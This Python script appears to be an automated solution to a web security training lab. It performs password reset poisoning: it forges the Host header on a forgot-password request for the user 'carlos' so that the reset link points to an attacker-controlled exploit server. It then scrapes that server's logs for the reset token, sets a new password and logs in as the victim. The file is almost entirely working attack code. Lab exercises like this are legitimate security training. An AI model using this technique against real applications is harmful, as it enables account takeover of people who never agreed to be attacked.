import requests
import time
from lxml import html
import urllib3
import re

# Disable the warning due to SSL certificate not valid
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# The host that to substitute inside the request
EVIL_HOST = "exploit-0a45009a04f3bd0a8050521f01d50036.exploit-server.net"
# URL 
URL = "https://0a6d009a0441bda38001535e004a0042.web-security-academy.net/"
# Evil URL
EVIL_URL = "https://"+EVIL_HOST+"/"
# Headers (the Host header will be changed later)
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
# Password
PASSWORD = "peter"

# Method to get csrf_token.
def get_csrf_token(URL, session):
    r_get = session.get(URL, headers=HEADERS, verify=False)
    tree = html.fromstring(r_get.content)
    csrf_token = tree.xpath('//input[@name="csrf"]/@value')[0]

    return csrf_token

# Session.
session = requests.Session()

# 1) 
# Make the prepared POST request using the victim data.
# Change the Host header.
# Send the request.
print("Making the request with the tampered Host header...")

csrf_token = get_csrf_token(URL+"forgot-password", session)

victim_data = {
    "csrf": csrf_token,
    "username": "carlos"
}

r_post = requests.Request('POST', URL+"forgot-password", data=victim_data, headers=HEADERS)
prepared_r_post = session.prepare_request(r_post)
prepared_r_post.headers['Host'] = EVIL_HOST

try:
    r_post = session.send(prepared_r_post, verify=False)
except Exception as e:
    print(f"It wasn't possible to send the prepared request with the evil host header.")

#time.sleep(10)

# 2)
# Access to exploit server logs.
# Find all the logs that contains the temp-forgot-password-token to extarct the string.
# Ask for the forgot-password page using the token associated to the victim reset password request.
# Provide the data to change the password in the request.
print("Getting the temp-forgot-token from the exploit server logs to recreate the URL to change password...")

r_get = session.get(EVIL_URL+"log", headers=HEADERS, verify=False)

tree = html.fromstring(r_get.content)
raw_logs = tree.xpath('//pre/text()')[0]
text_logs = str(raw_logs)
pattern = r"temp-forgot-password-token=([a-zA-Z0-9]+)"
tokens = re.findall(pattern, text_logs)

if not tokens:
    exit()

csrf_token = get_csrf_token(URL+"forgot-password?temp-forgot-password-token="+tokens[-1], session)

change_password_data = {
    "username": "carlos",
    "csrf": csrf_token,
    "temp-forgot-password-token": tokens[-1], 
    "new-password-1": PASSWORD,
    "new-password-2": PASSWORD
}

r_post = session.post(URL+"forgot-password?temp-forgot-password-token="+tokens[-1], headers=HEADERS, data=change_password_data)

# 3)
# Ask for the login page.
# Provide the NEW victim data.
print("Try to log in...")

csrf_token = get_csrf_token(URL+"login", session)

victim_data = {
    "csrf": csrf_token,
    "username": "carlos",
    "password": PASSWORD
}

r_post = session.post(URL+"login", headers=HEADERS, data=victim_data)

# If it is possible to log out the attacker must be inside the victim account.
if "Log out" in r_post.text:
    print(f"Successful exploit. Password changed in: {PASSWORD}")
    print(f"Lab solved.")
else:
    print("Failed.")








